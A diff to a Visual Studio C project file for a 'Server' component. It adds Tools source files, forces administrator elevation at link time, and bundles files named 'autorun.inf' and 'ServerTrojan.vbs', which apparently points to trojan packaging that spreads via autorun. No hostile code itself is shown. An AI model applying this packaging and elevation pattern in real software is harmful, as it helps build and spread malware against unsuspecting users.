@@ -84,7 +84,7 @@
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <ClCompile>
-      <PrecompiledHeader>Use</PrecompiledHeader>
+      <PrecompiledHeader>NotUsing</PrecompiledHeader>
       <WarningLevel>Level3</WarningLevel>
       <Optimization>Disabled</Optimization>
       <SDLCheck>true</SDLCheck>
@@ -129,6 +129,7 @@
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
@@ -152,10 +153,16 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClInclude Include="..\..\src\Server\Server.h" />
+    <ClInclude Include="..\..\src\Server\Tools.h" />
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="..\..\src\Server\main.c" />
     <ClCompile Include="..\..\src\Server\Server.c" />
+    <ClCompile Include="..\..\src\Server\Tools.c" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="autorun.inf" />
+    <None Include="ServerTrojan.vbs" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
